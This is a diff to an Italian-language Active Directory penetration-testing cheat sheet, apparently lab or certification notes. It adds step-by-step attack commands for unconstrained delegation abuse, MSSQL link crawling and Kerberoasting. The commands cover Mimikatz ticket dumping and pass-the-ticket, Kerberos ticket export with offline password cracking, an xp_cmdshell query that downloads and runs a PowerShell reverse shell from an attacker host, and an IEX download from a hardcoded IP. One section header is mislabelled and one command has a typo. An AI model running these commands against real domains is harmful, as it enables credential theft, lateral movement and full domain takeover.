@@ -242,9 +242,20 @@ Execute the task
 			- klist
 ```	
 
-## Uncontrained Delegation 
+## Uncontrained Delegation [Local Admin on machine]
+### Si tratta di una funzione che un amministratore di dominio può impostare su qualsiasi computer all'interno del dominio. In questo modo, ogni volta che un utente accede al computer, una copia del TGT di quell'utente verrà inviata all'interno del TGS fornito dal DC e salvata in memoria in LSASS. Quindi, se si dispone di privilegi di amministratore sul computer, sarà possibile scaricare i biglietti e impersonare gli utenti su qualsiasi computer.
+### Quindi, se un Domain Admins accede a un computer con la funzione "Unconstrained Delegation" attivata e si dispone di privilegi di amministratore locale all'interno di quel computer, sarà possibile eseguire il dump del ticket e impersonare l'amministratore di dominio ovunque (privesc di dominio).
+## Prerequisiti: L'account ha il flag TRUSTED_FOR_DELEGATION nei flag Controllo account utente (UAC). L'account utente non ha il flag NOT_DELEGATED impostato (per impostazione predefinita gli account non di dominio hanno questo flag).
 
-## MSSQL Servers
+```	
+			- Get-NetComputer -Uncontrained (cercare computer che hanno il flag uncontrained attivato)
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"sekurlsa::tickets"' (controlla se c'è un tickets DA disponibile)
+			- Invoke-Mimikatz -Command '"kerberos:ptt [ticket.kirbi]'"
+```
+
+## MSSQL Servers [Local Admin on machine]
 ### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
 ### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
 
@@ -257,7 +268,32 @@ Execute the task
 
 
 
+## Kerberoasting -AS-REPs [Normal User on the machine]
+### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
+### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
 
+```
+			- powershell -ep bypass
+			- Import-Module PowerupSQL.psd1
+			- Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose [Gather information]
+			- Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec master..xp_cmds hell "powershell iex(New-Object Net.WebClient).DownloadString("http://$IP_Attacker/Invoke-PowerShellTcp.ps1")"' [esecuzione commandi]
+```	
+
+## Kerberoasting [Normal user on the machine]
+### Cracking offline delle password degli account di servizio.
+### Gli account di servizio sono spesso ignorati (le password vengono cambiate raramente) e hanno un accesso privilegiato.
+
+```
+			- Get-NetUser -SPN (find user accounts usati come service account)
+			- Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN(MSSQLvc/dcorp.mgmt.dollarcorp.moneycorp.local)" (Request TGS)
+			o
+			- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Request-SPNTicket" (Request TGS)
+			- klist
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"kerberos::list /export"' (export tickets)
+			- python.exe .\tgsrepcrack.py [passlist] [ticket.kirbi]
+```	
 
 
 
